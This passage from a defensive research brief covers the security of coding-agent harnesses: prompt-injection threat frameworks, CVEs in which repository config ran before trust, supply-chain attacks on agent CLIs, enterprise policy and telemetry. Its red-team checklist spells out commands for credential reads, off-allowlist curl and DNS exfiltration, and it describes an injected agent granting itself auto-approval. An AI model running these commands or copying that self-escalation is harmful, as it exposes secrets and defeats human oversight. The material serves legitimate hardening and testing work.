- The sandbox runtime is the only host-level option that also confines MCP servers and hooks in CC. Codex has no documented equivalent, so for Codex, MCP and hooks need container/VM isolation or the MCP allowlist.

### Gaps
- No Codex doc found that states default read scope for legacy sandbox modes (also noted in the concept page). Permission profiles (beta) can deny paths.
- No independent evaluation of Seatbelt/bubblewrap sandbox strength for coding agents was found beyond vendor statements and the CVE above.
- OpenCode has no documented OS sandbox, so isolation must be external (container/VM).

## 4. Threat model: prompt injection, malicious repo config, supply chain; incidents and CVEs

### Takeaway
The core threat is that an agent with **private data access + untrusted content + an outbound channel** (lethal trifecta), or more broadly any two-plus-state-change combination (Meta's Rule of Two), can be steered by injected text. Defenses that rely on detection are unreliable against adaptive attackers. The second major threat class, proven by multiple CVEs in **both** leads, is **repository-supplied configuration** (hooks, MCP servers, env vars like base URLs, `CODEX_HOME` redirects) executing before or without meaningful consent. Supply-chain attacks now explicitly target installed agent CLIs and agent extensions.

### Cited Findings

**Frameworks**
- [Practitioner] (2025) Lethal trifecta: "Access to your private data", "Exposure to untrusted content", "The ability to externally communicate". Users mixing tools "must simply prevent these three elements from coexisting". MCP mix-and-match makes this easy to assemble by accident — [Simon Willison (Jun 16, 2025)](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- [Practitioner/Vendor research] (2025) Meta "Agents Rule of Two": within a session an agent should satisfy no more than two of [A] processes untrustworthy inputs, [B] accesses sensitive systems or private data, [C] changes state or communicates externally. If all three are needed, require human-in-the-loop or a fresh context — [Meta AI (Oct 31, 2025)](https://ai.meta.com/blog/practical-ai-agent-security/), summarized by [Willison](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/)
- [Practitioner/standards] The OWASP GenAI Security Project published the OWASP Top 10 for Agentic Applications on 2025-12-09 — [OWASP](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [Vendor] CC best practices for untrusted content: review commands before approval, "Avoid piping untrusted content directly to Claude", verify changes to critical files, "Use virtual machines (VMs) to run scripts and make tool calls, especially when interacting with external web services". WebFetch returns a model summary rather than the raw page — [CC security](https://code.claude.com/docs/en/security)

**Malicious repository configuration: CVEs in both leads**
- [Advisory] (2025) CC hooks in `.claude/settings.json` ran without confirmation on session start (CVSS 8.7; reported Jul 21, 2025; fixed Aug 26, 2025 in 1.0.87) — [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [Advisory] (2025) CVE-2025-59536 (CVSS 8.7): repository-controlled `enableAllProjectMcpServers`/`enabledMcpjsonServers` started MCP servers before the trust dialog. Fixed Sep 22, 2025 (1.0.111) — [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/), [GitLab advisory](https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2025-59536/)
- [Advisory] CVE-2026-21852: a project-set `ANTHROPIC_BASE_URL` redirected API requests carrying the API key in plaintext headers before trust confirmation. Reported Oct 28, 2025, fixed Dec 28, 2025, published Jan 21, 2026. Fix: defer network operations until consent — [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [Advisory] (2025) CVE-2025-61260: Codex CLI ≤ 0.23.0. A repo `.env` setting `CODEX_HOME=./.codex` plus `./.codex/config.toml` `mcp_servers` caused startup execution of attacker commands with no approval. Fixed by blocking project-level config redirects — [Check Point Research](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/), [NVD](https://nvd.nist.gov/vuln/detail/cve-2025-61260)
- [Advisory] (2025) CVE-2025-53773 (GitHub Copilot / VS Code, CVSS 7.8, Aug 2025): prompt injection made the agent write `"chat.tools.autoApprove": true` into `.vscode/settings.json` (a self-granted YOLO mode), leading to RCE. This motivates "agent can't edit its own config" protections like CC/Codex protected paths — [Wiz vulnerability DB](https://www.wiz.io/vulnerability-database/cve/cve-2025-53773)
- [Vendor] Current CC residual risk: hooks, the `env` block, `apiKeyHelper` and a project skill's hooks/`allowed-tools` **are used** in a `claude -p`/SDK run in a never-trusted folder, and `.mcp.json` servers are connected without asking there. Before running `-p` in a repo you didn't write: `--setting-sources user`, `--bare`, `--settings '{"disableAllHooks": true}'` (user-settings alone isn't enough, because project settings take precedence), `disabledMcpjsonServers` — [CC permissions, "What runs before you trust a folder"](https://code.claude.com/docs/en/permissions)
- [Vendor] Additional directories added via `permissions.additionalDirectories` grant file access only and don't load the directory's configuration; `--add-dir`/`/add-dir` have listed exceptions — [CC permissions](https://code.claude.com/docs/en/permissions)

**Supply chain**
- [Advisory] (2025) s1ngularity/Nx (Aug 26, 2025): malicious npm postinstall used local Claude/Gemini/Q CLIs with bypass flags for secret reconnaissance — [Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack)
- [Advisory] (2025) Amazon Q Developer VS Code extension 1.84.0 shipped malicious code (a wipe prompt) after an attacker used an "inappropriately scoped GitHub token in their CodeBuild configuration" to commit it. It failed due to a syntax error. Fixed in 1.85.0; CVE-2025-8217 — [AWS security bulletin AWS-2025-015](https://aws.amazon.com/security/security-bulletins/AWS-2025-015/)
- [Vendor] CC: Anthropic reviews directory connectors against listing criteria but "does not security-audit or manage any MCP server". Write your own or use trusted providers — [CC security](https://code.claude.com/docs/en/security)
- [Vendor] Auto mode treats routing package installs around an internal registry to a public one as blocked by default when an internal registry is declared — [CC permission modes](https://code.claude.com/docs/en/permission-modes)

### Inferences
- In a typical coding session all three trifecta legs are present by default: repo + env secrets (A), issues/web/dependency READMEs (B), network/git push (C). The practical lever is cutting leg C (egress allowlist, no push without ask) or leg A (no secrets in the agent's reach), not detecting injection.
- Every CVE in this list exploited something running **before or outside** the permission system (startup hooks, MCP launch, base URL, config redirect, model-chosen cwd, auto-approved "safe" commands). Verification should focus on those pre-trust and out-of-sandbox paths, not only on rule lists.
- Keep harness versions current and auto-updating, except where pinned in a container on purpose. Several fixes were delivered by forced updates (e.g. CC deprecating versions before 1.0.24 per the CVE-2025-55284 advisory text).

### Gaps
- No incident data found specific to OpenCode.

## 5. Enterprise/team rollout: managed settings, requirements, audit logging, OpenTelemetry

### Takeaway
Deliver policy through channels that repository files cannot change (MDM, server-managed or cloud-delivered requirements, system files). Use it to: require the sandbox and fail closed, disable bypass, constrain approval presets/sandbox modes, allowlist MCP servers, lock egress domains, deny secret reads, and pin a telemetry destination. Export OTel with prompt content redacted by default, and use tool-decision events as the audit trail.

### Cited Findings

**CC managed policy**
- [Vendor] Enforce the sandbox: managed `{"sandbox": {"enabled": true, "failIfUnavailable": true, "allowUnsandboxedCommands": false}}`. Add org-approved `excludedCommands` and `sandbox.credentials` entries for `~/.aws`, `~/.ssh` and secret env vars to the managed file, because an admin-required sandbox stops repository settings from excluding commands — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Locks against widening: `allowManagedReadPathsOnly`, `allowManagedDomainsOnly`. Managed `sandbox.filesystem` or `credentials.files` `deny` entries make `filesystem.disabled` managed-only. `enableWeakerNestedSandbox`, `enableWeakerNetworkIsolation`, `allowAllUnixSockets` can be locked. Windows hosts exit under `failIfUnavailable`, so deliver per-OS via MDM — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] `allowManagedPermissionRulesOnly` makes managed settings the only source of permission rules. `disableBypassPermissionsMode`; auto mode can be turned off by the org; managed MCP configuration restricts which servers run — [CC permissions](https://code.claude.com/docs/en/permissions), [CC security](https://code.claude.com/docs/en/security)
- [Vendor] Team checklist: managed settings for org standards, share approved permission configs via VCS, train users, monitor via OTel, `ConfigChange` hooks to audit/block in-session settings changes, audit with `/permissions` — [CC security](https://code.claude.com/docs/en/security)

**Codex requirements**
- [Vendor] Example `requirements.toml`: `allowed_approval_policies = ["on-request"]`, `allowed_sandbox_modes = ["read-only","workspace-write"]`, `[rules] prefix_rules` with `decision = "prompt"` for shells, `[mcp_servers.<id>] identity = { command = "..." }` allowlist, `[experimental_network] managed_allowed_domains_only = true` with `[experimental_network.domains]` allow/deny. Also `[permissions.filesystem]` deny-read globs users cannot weaken, `[hooks]`, `[features]` pins. Delivery: Agent Security cloud console (signed bundles), macOS MDM `com.openai.codex:requirements_toml_base64`, `/etc/codex/requirements.toml` — [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration)
- [Vendor] Codex admin recommendations: assign an owner and business justification per policy; test allowed and blocked workflows before rollout; "Keep `network_access = false` in managed defaults unless security review permits otherwise"; pin OTel exporter but keep `log_user_prompt = false` unless policy allows; validate `[[remote_sandbox_config]]` host overrides on deployed client versions — [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration)
- [Vendor] Admin `prefix_rules` can only be `prompt`/`forbidden` (per the local concept page) — [local concept page](../../concepts/permissions-and-sandbox.md)

**Audit logging / OpenTelemetry**
- [Vendor] CC OTel: enable with `CLAUDE_CODE_ENABLE_TELEMETRY=1` + OTLP exporters. Events include `claude_code.tool_decision` (decision and source: config, hook, user_permanent, user_temporary, user_abort, user_reject), `claude_code.tool_result`, `claude_code.user_prompt` (prompt text redacted by default), `claude_code.api_request`. Content gates `OTEL_LOG_USER_PROMPTS`, `OTEL_LOG_TOOL_DETAILS`, `OTEL_LOG_TOOL_CONTENT` are off by default. Setting endpoint/headers in managed settings removes conflicting developer-set variables so telemetry can't be redirected. `tool_use_id` and `prompt.id` correlate decisions with results — [CC monitoring](https://code.claude.com/docs/en/monitoring-usage)
- [Vendor] Codex `[otel]` is opt-in (`otlp-http`/`otlp-grpc`/`none`). Events: `codex.tool_decision` (approved/denied + decision source), `codex.tool_result`, `codex.user_prompt` (redacted unless `log_user_prompt = true`), `codex.api_request`. Local history in `~/.codex/history.jsonl` (`[history] persistence = "none"` to disable) — [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced); guidance to "route telemetry to controlled collectors only; apply retention limits" — [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)
- [Vendor] CC cloud sessions: "All operations in cloud sessions are logged for compliance and audit purposes" — [CC security](https://code.claude.com/docs/en/security)

### Inferences
- The two leads map cleanly for rollout: CC managed `sandbox.*` + `disableBypassPermissionsMode` + `allowManaged*Only` ↔ Codex `allowed_sandbox_modes` + `allowed_approval_policies` + `[experimental_network]` + `[permissions.filesystem]`. Both have MCP allowlists and both export a `tool_decision` event that serves as the audit spine.
- Prompt/tool-content logging is a privacy trade-off. Both vendors default it off. Enabling `OTEL_LOG_TOOL_DETAILS` (commands, paths) is the minimum useful for security review. Logging full prompts needs a policy decision.
- A dev container that copies managed settings from the repo is convenient but forgeable. Real enforcement needs MDM/server-managed delivery plus software allowlisting if "only inside the container" is a requirement.

### Gaps
- No public data found on how many organizations use managed settings/requirements, or on rollout outcomes.
- SIEM detection content (queries for exfil patterns over `tool_decision` events) was not found from vendors.

## 6. Verifying the posture

### Takeaway
Verify with the harness's own diagnostics (resolved layers, rule sources, sandbox config), with negative tests that should be blocked (secret reads, off-allowlist egress, alternative command spellings, writes to protected paths, unsandboxed retry), and with telemetry that shows denials. Re-verify after upgrades, because defaults and precedence details change between versions.

### Cited Findings
- [Vendor] CC: `/status` shows setting sources; `/permissions` lists rules by source file and has a "Recently denied" tab; `/sandbox` Config tab shows resolved protected paths ("Denied within allowed"); `claude doctor` flags sandbox misconfigurations (e.g. "TLS termination is unavailable", unmatched `injectHosts`, ambiguous domain spellings, stale sandbox mask files) — [CC sandboxing](https://code.claude.com/docs/en/sandboxing), [CC permission modes](https://code.claude.com/docs/en/permission-modes), [local concept page](../../concepts/configuration.md)
- [Vendor] CC: to confirm an `excludedCommands` entry, switch to Manual mode and run a matching state-changing command; the prompt is titled "Bash command (unsandboxed)" — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] CC: in `-p` runs without trust, a stderr "this workspace has not been trusted" warning shows skipped allow rules — [CC permissions](https://code.claude.com/docs/en/permissions)
- [Vendor] Codex: `codex execpolicy check --pretty --rules <file> -- <command>` shows matching rules and the strictest decision; rules support inline `match`/`not_match` examples as self-tests; `/debug-config`, `/status`, `codex doctor` show resolved config; `--strict-config` errors on unknown fields — [Codex rules](https://learn.chatgpt.com/codex/rules), [local concept page](../../concepts/configuration.md)
- [Vendor] OpenCode: `opencode debug config` shows merged config — [local concept page](../../concepts/configuration.md)
- [Vendor] CC sandbox runtime: a clean start is not proof the settings loaded — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [Vendor] Codex admins: "Test allowed and blocked workflows before rollout" — [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration)
- [Vendor] CC telemetry verification: check for `claude_code.session.count` or a `user_prompt` event; `claude --debug-file <path>` and look for `[3P telemetry]` errors — [CC monitoring](https://code.claude.com/docs/en/monitoring-usage)

### Inferences
- A short red-team checklist, derived from the CVEs and doc limitations above: (1) ask the agent to `cat ~/.ssh/id_*` / `~/.aws/credentials` via Bash **and** via the Read tool; (2) `curl` an off-allowlist host, then `/usr/bin/curl` and `sh -c 'curl ...'`; (3) `nslookup $(cat secret).example.com` (DNS exfil class, CVE-2025-55284); (4) write to `.claude/settings.json`, `.codex/config.toml`, `.git/hooks/`, `~/.zshrc`; (5) force a sandbox failure and check whether an unsandboxed retry is offered; (6) clone a test repo with hooks, `.mcp.json`, `env.ANTHROPIC_BASE_URL`/`.env CODEX_HOME` and confirm nothing runs before trust, including in `-p`/`exec` mode; (7) start with the bypass/yolo flag and confirm policy refuses it; (8) confirm `tool_decision` deny events appear in the collector.
- Re-run the checklist after harness upgrades. The docs record many version-gated behavior changes (e.g. CC v2.1.207 local-file trust, v2.1.285 strict-sandbox precedence; Codex 0.134 profiles).

### Gaps
- No vendor-provided conformance test suite or "security self-check" command for permissions/sandbox posture was found for either lead.
- No published third-party benchmark of sandbox escape resistance for CC or Codex was found.
